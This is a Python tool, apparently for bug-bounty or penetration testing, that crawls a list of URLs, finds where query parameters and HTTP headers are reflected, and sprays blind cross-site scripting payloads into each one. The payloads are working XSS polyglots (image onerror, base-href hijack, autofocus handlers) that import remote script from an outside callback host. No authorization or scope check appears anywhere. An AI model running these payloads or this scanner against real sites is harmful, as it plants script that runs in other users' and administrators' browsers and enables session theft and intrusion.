#!/usr/bin/env python3
"""
Reflection & Blind Injection Scanner
Detects reflection points and injects blind payloads for manual follow-up.
"""

import os
import sys
import json
import time
import random
import string
import hashlib
import logging
import argparse
import threading
import signal
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from colorama import init, Fore, Style

# ─────────────────────────────────────────────
#  REFLECTION PROBES  (token inserted at runtime)
# ─────────────────────────────────────────────
REFLECTION_PROBES = {
    "html_body":           '{token}">/<',
    "js_string_double":    '{token}"-x-"',
    "js_string_single":    "{token}\\'-x-\\'",
    "unquoted_attr":       "{token} x=",
    "html_comment":        "{token}--><",
}

# Context indicators — what chars around token tell us
CONTEXT_INDICATORS = {
    "script_block":   ["</script", "<script", "var ", "function(", "=>"],
    "html_attribute": ['="', "='", " ", "/>", ">"],
    "html_comment":   ["<!--", "-->"],
    "html_body":      ["<", ">", "/"],
    "json_value":     ['":', '",', '"}', '"]'],
    "css_value":      ["style=", "{", ":", ";"],
}

# ─────────────────────────────────────────────
#  BLIND PAYLOADS  ({bid} replaced at runtime)
# ─────────────────────────────────────────────
BLIND_PAYLOADS = {
    "default": (
        '1\'"<B/-->'
        '<Img Src=//X55.is?1=17223&id={bid} '
        'OnError=import(src)>'
    ),
    "filter_csp": (
        '1\'"</Script>'
        '<Base id={bid} Href=//X55.is>'
    ),
    "short_polyglot": (
        "1'/*\\'/*\"/*\\\"/*</Script/-->"
        "<Input/AutoFocus/OnFocus=/**/"
        "(import(/https:\\\\X55.is?1=17223&id={bid}/.source))//>"
    ),
    "full_polyglot": (
        "JavaScript://%250A/*?'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*"
        "<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>"
        "\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/"
        "(import(/https:\\\\X55.is?1=17223&id={bid}/.source))}"
        "//\\76-->"
    ),
}

# Headers to test for reflection
INJECTABLE_HEADERS = [
    "Referer",
    "User-Agent",
    "X-Forwarded-For",
    "Accept-Language",
]

# HTTP status codes that are retryable (network-level failures only)
RETRYABLE_EXCEPTIONS = (
    requests.exceptions.ConnectTimeout,
    requests.exceptions.ReadTimeout,
    requests.exceptions.ConnectionError,
    requests.exceptions.ChunkedEncodingError,
)

RETRY_DELAYS = [2, 5, 15]   # seconds between retry attempts

# ─────────────────────────────────────────────
#  GLOBALS  (shared across threads)
# ─────────────────────────────────────────────
_lock            = threading.Lock()
_checkpoint_lock = threading.Lock()
_output_lock     = threading.Lock()
urls_processed   = 0
urls_total       = 0
shutdown_flag    = threading.Event()

# ─────────────────────────────────────────────
#  LOGGING
# ─────────────────────────────────────────────
def setup_logging(verbose: bool) -> None:
    level = logging.DEBUG if verbose else logging.INFO
    fmt   = "%(asctime)s [%(levelname)s] %(message)s"
    logging.basicConfig(level=level, format=fmt, datefmt="%H:%M:%S")

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────
#  TOKEN / ID HELPERS
# ─────────────────────────────────────────────
def generate_token(length: int = 6) -> str:
    """Random lowercase alphanumeric token — looks like a normal value."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def generate_blind_id(url: str, param: str) -> str:
    """Deterministic 8-char ID from url+param — unique, traceable."""
    raw = f"{url}:{param}".encode()
    return hashlib.sha256(raw).hexdigest()[:8]


# ─────────────────────────────────────────────
#  URL HELPERS
# ─────────────────────────────────────────────
def set_param(url: str, param: str, value: str) -> str:
    """Return URL with the given param set to value."""
    parsed = list(urlparse(url))
    qs = parse_qs(parsed[4], keep_blank_values=True)
    qs[param] = [value]
    parsed[4] = urlencode(qs, doseq=True)
    return urlunparse(parsed)


def set_all_params(url: str, param_tokens: dict) -> str:
    """Set multiple params at once — each to its own token."""
    parsed = list(urlparse(url))
    qs = parse_qs(parsed[4], keep_blank_values=True)
    for p, v in param_tokens.items():
        qs[p] = [v]
    parsed[4] = urlencode(qs, doseq=True)
    return urlunparse(parsed)


def extract_params(url: str) -> dict:
    """Return {param: [values]} from URL query string."""
    return parse_qs(urlparse(url).query, keep_blank_values=True)


# ─────────────────────────────────────────────
#  REQUEST ENGINE  (retry + backoff)
# ─────────────────────────────────────────────
def fetch(url: str, session: requests.Session, timeout: int,
          extra_headers: dict = None) -> requests.Response | None:
    """
    Fetch URL with retry/backoff.
    Returns Response on any HTTP reply (including 4xx/5xx).
    Returns None only if all retries fail (network-level errors).
    """
    headers = {}
    if extra_headers:
        headers.update(extra_headers)

    for attempt, delay in enumerate([0] + RETRY_DELAYS):
        if shutdown_flag.is_set():
            return None
        if delay:
            logger.debug(f"Retry {attempt} for {url} — waiting {delay}s")
            time.sleep(delay)
        try:
            resp = session.get(url, timeout=timeout, allow_redirects=True,
                               headers=headers)
            return resp          # success — even 4xx/5xx is a valid response
        except RETRYABLE_EXCEPTIONS as e:
            logger.debug(f"Retryable error on {url}: {e}")
            continue
        except requests.exceptions.RequestException as e:
            logger.debug(f"Non-retryable error on {url}: {e}")
            return None          # don't retry on non-network errors

    return None   # exhausted retries


# ─────────────────────────────────────────────
#  REFLECTION ANALYSIS
# ─────────────────────────────────────────────
def classify_context(response_text: str, token: str) -> tuple[str, bool, bool]:
    """
    Find token in response and classify context.
    Returns (context_label, is_encoded, is_partial).
    """
    text = response_text

    # Check for encoded forms first
    encoded_variants = [
        quote(token),
        token.upper(),
        token.replace('"', '&quot;').replace('>', '&gt;').replace('<', '&lt;'),
    ]

    is_encoded = False
    is_partial  = False
    found_token = token

    if token.lower() in text.lower():
        found_token = token
    else:
        for variant in encoded_variants:
            if variant.lower() in text.lower():
                found_token = variant
                is_encoded  = True
                break
        else:
            # Check partial match (first 4 chars of token)
            if token[:4].lower() in text.lower():
                is_partial = True
                found_token = token[:4]
            else:
                return ("not_reflected", False, False)

    # Find position and inspect surrounding characters
    idx = text.lower().find(found_token.lower())
    if idx == -1:
        return ("not_reflected", False, False)

    # Immediate prefix/suffix (10 chars) — used for tight context checks
    pre_start  = max(0, idx - 10)
    post_end   = min(len(text), idx + len(found_token) + 10)
    immediate_pre  = text[pre_start:idx].lower()
    immediate_post = text[idx + len(found_token):post_end].lower()

    # Wider window (60 chars each side) — used for block-level context
    window_start = max(0, idx - 60)
    window_end   = min(len(text), idx + len(found_token) + 60)
    window       = text[window_start:window_end].lower()

    # ── Script block: wide window check ───────────────────────
    if any(ind in window for ind in ["</script", "var ", "function(", "=>"]):
        return ("script_block", is_encoded, is_partial)

    # ── HTML comment: wide window check ───────────────────────
    if any(ind in window for ind in ['<!--', '-->']):
        return ("html_comment", is_encoded, is_partial)

    # ── JSON value: wide window check ─────────────────────────
    if any(ind in window for ind in ['":', '",', '"}', '"]']):
        return ("json_value", is_encoded, is_partial)

    # ── CSS value: wide window check ──────────────────────────
    if "style=" in window or ('{' in window and ':' in window and ';' in window):
        return ("css_value", is_encoded, is_partial)

    # ── HTML attribute: IMMEDIATE prefix must end with =" or ='
    # This avoids false positives from =" appearing elsewhere in window
    if immediate_pre.endswith('="') or immediate_pre.endswith("='") or \
       immediate_pre.endswith('="') or '="' in immediate_pre[-4:] or \
       "='" in immediate_pre[-4:]:
        return ("html_attribute", is_encoded, is_partial)

    return ("html_body", is_encoded, is_partial)


def confidence_score(context: str, is_encoded: bool, is_partial: bool) -> str:
    if is_partial:
        return "partial"
    if is_encoded:
        return "low"
    if context in ("html_body", "html_attribute"):
        return "high"
    if context in ("script_block", "json_value"):
        return "medium"
    if context == "html_comment":
        return "medium"
    return "low"


# ─────────────────────────────────────────────
#  OUTPUT WRITERS
# ─────────────────────────────────────────────
class OutputManager:
    """Thread-safe writer for all output files."""

    def __init__(self, domain: str):
        self.findings_path   = f"{domain}_findings.json"
        self.blind_log_path  = f"{domain}_blind_log.json"
        self.failed_path     = f"{domain}_failed.txt"
        self.errors_path     = f"{domain}_errors.txt"
        self.checkpoint_path = f"{domain}.checkpoint"
        self._checkpoint_set: set[str] = set()

        # Initialize JSON array files
        for path in [self.findings_path, self.blind_log_path]:
            if not os.path.exists(path):
                with open(path, 'w') as f:
                    f.write('[]\n')

        # Load existing checkpoint
        if os.path.exists(self.checkpoint_path):
            with open(self.checkpoint_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        self._checkpoint_set.add(line)
            logger.info(f"Resumed — {len(self._checkpoint_set)} URLs already done")

    def is_done(self, url: str) -> bool:
        return url in self._checkpoint_set

    def mark_done(self, url: str) -> None:
        with _checkpoint_lock:
            self._checkpoint_set.add(url)
            with open(self.checkpoint_path, 'a') as f:
                f.write(url + '\n')

    def write_finding(self, entry: dict) -> None:
        with _output_lock:
            self._append_to_json(self.findings_path, entry)

    def write_blind_log(self, entry: dict) -> None:
        with _output_lock:
            self._append_to_json(self.blind_log_path, entry)

    def write_failed(self, url: str) -> None:
        with _output_lock:
            with open(self.failed_path, 'a') as f:
                f.write(url + '\n')

    def write_error(self, url: str, status: int) -> None:
        with _output_lock:
            with open(self.errors_path, 'a') as f:
                f.write(f"{status} {url}\n")

    def _append_to_json(self, path: str, entry: dict) -> None:
        """Append entry to JSON array file."""
        with open(path, 'r+') as f:
            content = f.read().strip()
            if content == '[]' or content == '[\n]':
                f.seek(0)
                f.write('[\n' + json.dumps(entry, indent=2) + '\n]\n')
                f.truncate()
            else:
                # Remove trailing ] and append
                f.seek(0, 2)  # end of file
                pos = f.tell()
                # Walk back to find last ]
                while pos > 0:
                    pos -= 1
                    f.seek(pos)
                    ch = f.read(1)
                    if ch == ']':
                        f.seek(pos)
                        f.write(',\n' + json.dumps(entry, indent=2) + '\n]')
                        f.truncate()
                        break

    def finalize(self, clean: bool) -> None:
        """Delete checkpoint on clean finish."""
        if clean and os.path.exists(self.checkpoint_path):
            os.remove(self.checkpoint_path)
            logger.info("Checkpoint cleared — clean run.")


# ─────────────────────────────────────────────
#  PHASE 1 — REFLECTION SCANNING
# ─────────────────────────────────────────────
def scan_reflection(url: str, params: dict, session: requests.Session,
                    timeout: int, out: OutputManager) -> bool:
    """
    Test each param with all probe types.
    Also fires one all-params-simultaneous request.
    Returns True if any reflection found.
    """
    found_any = False

    # Per-param, per-probe
    for param in params:
        for probe_name, probe_template in REFLECTION_PROBES.items():
            if shutdown_flag.is_set():
                return found_any

            token = generate_token()
            probe_value = probe_template.replace("{token}", token)
            modified_url = set_param(url, param, probe_value)

            resp = fetch(modified_url, session, timeout)

            if resp is None:
                # Network failure — already handled by caller
                return found_any

            # Log HTTP errors to errors file (but still check body)
            if resp.status_code >= 400:
                out.write_error(url, resp.status_code)

            # Check all redirect hops
            responses_to_check = [resp]
            for r in resp.history:
                responses_to_check.insert(0, r)

            for r in responses_to_check:
                try:
                    body = r.text
                except Exception:
                    continue

                context, is_encoded, is_partial = classify_context(body, token)
                if context == "not_reflected":
                    continue

                confidence = confidence_score(context, is_encoded, is_partial)
                content_type = r.headers.get("Content-Type", "unknown")

                entry = {
                    "url":          modified_url,
                    "original_url": url,
                    "param":        param,
                    "method":       "GET",
                    "probe_type":   probe_name,
                    "token":        token,
                    "reflection_context": context,
                    "encoded":      is_encoded,
                    "partial":      is_partial,
                    "confidence":   confidence,
                    "http_status":  r.status_code,
                    "content_type": content_type,
                    "landed_url":   r.url,
                    "timestamp":    datetime.utcnow().isoformat(),
                }

                out.write_finding(entry)
                found_any = True
                logger.debug(f"FOUND [{confidence}] {param} → {context} @ {url}")

    # All-params-simultaneous request
    if len(params) > 1:
        param_tokens = {p: generate_token() for p in params}
        all_url = set_all_params(url, {
            p: REFLECTION_PROBES["html_body"].replace("{token}", t)
            for p, t in param_tokens.items()
        })
        resp = fetch(all_url, session, timeout)
        if resp is not None:
            for param, token in param_tokens.items():
                context, is_encoded, is_partial = classify_context(resp.text, token)
                if context != "not_reflected":
                    confidence = confidence_score(context, is_encoded, is_partial)
                    entry = {
                        "url":          all_url,
                        "original_url": url,
                        "param":        param,
                        "method":       "GET",
                        "probe_type":   "all_params_simultaneous",
                        "token":        token,
                        "reflection_context": context,
                        "encoded":      is_encoded,
                        "partial":      is_partial,
                        "confidence":   confidence,
                        "http_status":  resp.status_code,
                        "content_type": resp.headers.get("Content-Type", "unknown"),
                        "landed_url":   resp.url,
                        "timestamp":    datetime.utcnow().isoformat(),
                    }
                    out.write_finding(entry)
                    found_any = True

    return found_any


# ─────────────────────────────────────────────
#  PHASE 2 — BLIND INJECTION
# ─────────────────────────────────────────────
def inject_blind(url: str, params: dict, session: requests.Session,
                 timeout: int, out: OutputManager,
                 got_waf_block: bool = False) -> None:
    """
    Fire blind payloads into each param. Fire and forget.
    """
    for param in params:
        if shutdown_flag.is_set():
            return

        bid = generate_blind_id(url, param)

        # Decide which payloads to send
        payloads_to_send = ["default", "full_polyglot"]
        if got_waf_block:
            payloads_to_send.append("filter_csp")

        for payload_name in payloads_to_send:
            payload = BLIND_PAYLOADS[payload_name].replace("{bid}", bid)
            modified_url = set_param(url, param, payload)

            # Fire and forget — we don't analyze the response
            fetch(modified_url, session, timeout)

            entry = {
                "url":          modified_url,
                "original_url": url,
                "param":        param,
                "method":       "GET",
                "blind_id":     bid,
                "payload_type": payload_name,
                "callback_url": f"https://X55.is?1=17223&id={bid}",
                "timestamp":    datetime.utcnow().isoformat(),
            }
            out.write_blind_log(entry)
            logger.debug(f"BLIND [{payload_name}] {param} @ {url} — id={bid}")


# ─────────────────────────────────────────────
#  PHASE 3 — HEADER INJECTION
# ─────────────────────────────────────────────
def scan_headers(url: str, session: requests.Session,
                 timeout: int, out: OutputManager) -> None:
    """
    Inject probe + short_polyglot blind into common headers.
    """
    for header in INJECTABLE_HEADERS:
        if shutdown_flag.is_set():
            return

        token = generate_token()
        probe = REFLECTION_PROBES["html_body"].replace("{token}", token)

        resp = fetch(url, session, timeout, extra_headers={header: probe})
        if resp is None:
            continue

        context, is_encoded, is_partial = classify_context(resp.text, token)
        if context != "not_reflected":
            confidence = confidence_score(context, is_encoded, is_partial)
            entry = {
                "url":          url,
                "original_url": url,
                "param":        f"[header:{header}]",
                "method":       "GET",
                "probe_type":   "html_body",
                "token":        token,
                "reflection_context": context,
                "encoded":      is_encoded,
                "partial":      is_partial,
                "confidence":   confidence,
                "http_status":  resp.status_code,
                "content_type": resp.headers.get("Content-Type", "unknown"),
                "landed_url":   resp.url,
                "timestamp":    datetime.utcnow().isoformat(),
            }
            out.write_finding(entry)

        # Blind injection via header (short polyglot)
        bid = generate_blind_id(url, header)
        payload = BLIND_PAYLOADS["short_polyglot"].replace("{bid}", bid)
        fetch(url, session, timeout, extra_headers={header: payload})
        entry = {
            "url":          url,
            "original_url": url,
            "param":        f"[header:{header}]",
            "method":       "GET",
            "blind_id":     bid,
            "payload_type": "short_polyglot",
            "callback_url": f"https://X55.is?1=17223&id={bid}",
            "timestamp":    datetime.utcnow().isoformat(),
        }
        out.write_blind_log(entry)


# ─────────────────────────────────────────────
#  PER-URL WORKER
# ─────────────────────────────────────────────
def process_url(url: str, args: argparse.Namespace,
                out: OutputManager) -> None:
    """Full processing pipeline for one URL."""
    global urls_processed

    if shutdown_flag.is_set():
        return

    params = extract_params(url)
    if not params:
        with _lock:
            urls_processed += 1
        print(Fore.YELLOW + f"\r[{urls_processed}/{urls_total}] no-params: {url[:80]}",
              end=" ", flush=True)
        out.mark_done(url)
        return

    # Build session
    session = requests.Session()
    session.headers["User-Agent"] = args.user_agent
    if args.cookie:
        session.headers["Cookie"] = args.cookie
    if args.header:
        for h in args.header:
            k, _, v = h.partition(':')
            session.headers[k.strip()] = v.strip()

    # Track if we see WAF blocks
    got_waf_block = False

    # ── Phase 1: Reflection ────────────────────────────
    try:
        scan_reflection(url, params, session, args.timeout, out)
    except Exception as e:
        logger.debug(f"Reflection error on {url}: {e}")

    # Check if we got 403s (WAF indicator) from errors file — approximation
    # We detect this by checking if a sample request returns 403
    try:
        sample = fetch(url, session, args.timeout)
        if sample is not None and sample.status_code == 403:
            got_waf_block = True
    except Exception:
        pass

    # ── Phase 2: Blind Injection ───────────────────────
    if not args.no_blind:
        try:
            inject_blind(url, params, session, args.timeout, out, got_waf_block)
        except Exception as e:
            logger.debug(f"Blind injection error on {url}: {e}")

    # ── Phase 3: Header Injection ──────────────────────
    if not args.no_headers:
        try:
            scan_headers(url, session, args.timeout, out)
        except Exception as e:
            logger.debug(f"Header scan error on {url}: {e}")

    # ── Done ───────────────────────────────────────────
    out.mark_done(url)
    session.close()

    with _lock:
        urls_processed += 1
        print(Fore.BLUE + f"\r[{urls_processed}/{urls_total}]",
              end=" ", flush=True)

    # Per-domain rate limiting
    time.sleep(args.delay)


# ─────────────────────────────────────────────
#  NETWORK FAILURE HANDLER (for the outer loop)
# ─────────────────────────────────────────────
def process_url_safe(url: str, args: argparse.Namespace,
                     out: OutputManager) -> None:
    """Wraps process_url — writes to failed.txt if all retries fail."""
    # Build a quick session just to check connectivity
    session = requests.Session()
    session.headers["User-Agent"] = args.user_agent

    # Try to reach the URL at all
    resp = fetch(url, session, args.timeout)
    session.close()

    if resp is None:
        # Genuine network failure after all retries
        print(Fore.RED + f"\r[FAILED] {url[:80]}", flush=True)
        out.write_failed(url)
        with _lock:
            global urls_processed
            urls_processed += 1
        return

    process_url(url, args, out)


# ─────────────────────────────────────────────
#  ARGUMENT PARSER
# ─────────────────────────────────────────────
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="Reflection & Blind Injection Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 scanner.py urls.txt
  python3 scanner.py urls.txt --threads 10 --cookie "session=abc123"
  python3 scanner.py failed_urls.txt --no-blind --threads 3
        """
    )
    p.add_argument("file",
                   help="Text file with one URL per line")
    p.add_argument("--cookie",
                   help='Cookie header value e.g. "session=abc; user=xyz"')
    p.add_argument("--header", action="append", metavar="NAME:VALUE",
                   help="Extra request header (repeatable)")
    p.add_argument("--threads", type=int, default=5,
                   help="Concurrent workers (default: 5)")
    p.add_argument("--timeout", type=int, default=23,
                   help="Request timeout in seconds (default: 23)")
    p.add_argument("--delay", type=float, default=0.25,
                   help="Delay between requests per worker (default: 0.25s)")
    p.add_argument("--user-agent", default=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/129.0.0.0 Safari/537.36"),
                   help="Custom User-Agent string")
    p.add_argument("--no-blind", action="store_true",
                   help="Skip blind payload injection phase")
    p.add_argument("--no-headers", action="store_true",
                   help="Skip header injection phase")
    p.add_argument("--resume", action="store_true",
                   help="Resume from checkpoint (auto-detected if checkpoint exists)")
    p.add_argument("--verbose", action="store_true",
                   help="Debug-level logging")
    return p


# ─────────────────────────────────────────────
#  SIGNAL HANDLER  (Ctrl+C graceful shutdown)
# ─────────────────────────────────────────────
def handle_interrupt(sig, frame):
    print(Fore.YELLOW + "\n[!] Interrupted — flushing outputs and saving checkpoint...")
    shutdown_flag.set()


# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────
def main():
    global urls_total

    init(autoreset=True)
    signal.signal(signal.SIGINT, handle_interrupt)

    parser = build_parser()
    args   = parser.parse_args()
    setup_logging(args.verbose)

    if not os.path.exists(args.file):
        print(f"[!] File not found: {args.file}")
        sys.exit(1)

    # Derive domain name from filename for output files
    domain = os.path.splitext(os.path.basename(args.file))[0]
    out    = OutputManager(domain)

    # Load URLs
    with open(args.file, 'r') as f:
        all_urls = [line.strip() for line in f if line.strip()]

    # Filter already-done URLs (checkpoint resume)
    pending = [u for u in all_urls if not out.is_done(u)]
    urls_total = len(all_urls)
    skipped    = len(all_urls) - len(pending)

    print(Fore.CYAN + f"[*] Total URLs : {urls_total}")
    if skipped:
        print(Fore.YELLOW + f"[*] Resuming   : {skipped} already done, {len(pending)} remaining")
    print(Fore.CYAN + f"[*] Threads    : {args.threads}")
    print(Fore.CYAN + f"[*] Output     : {domain}_findings.json")
    print(Fore.CYAN + f"[*] Blind log  : {domain}_blind_log.json")
    print(Fore.CYAN + f"[*] Failed     : {domain}_failed.txt")
    if args.no_blind:
        print(Fore.YELLOW + "[*] Blind injection: DISABLED")
    if args.no_headers:
        print(Fore.YELLOW + "[*] Header injection: DISABLED")
    print()

    clean_finish = False
    try:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {
                executor.submit(process_url_safe, url, args, out): url
                for url in pending
            }
            for future in as_completed(futures):
                if shutdown_flag.is_set():
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                try:
                    future.result()
                except Exception as e:
                    url = futures[future]
                    logger.debug(f"Worker exception for {url}: {e}")

        if not shutdown_flag.is_set():
            clean_finish = True

    except Exception as e:
        logger.error(f"Fatal error: {e}")
    finally:
        out.finalize(clean_finish)

    print()
    if clean_finish:
        print(Fore.GREEN + f"[+] Done. {urls_processed} URLs processed.")
    else:
        print(Fore.YELLOW + f"[!] Stopped. {urls_processed} URLs processed (checkpoint saved).")

    print(Fore.CYAN + f"[*] Findings   → {domain}_findings.json")
    print(Fore.CYAN + f"[*] Blind log  → {domain}_blind_log.json")
    print(Fore.CYAN + f"[*] Failed     → {domain}_failed.txt  (re-run this file if non-empty)")
    print(Fore.CYAN + f"[*] Errors     → {domain}_errors.txt")


if __name__ == "__main__":
    main()
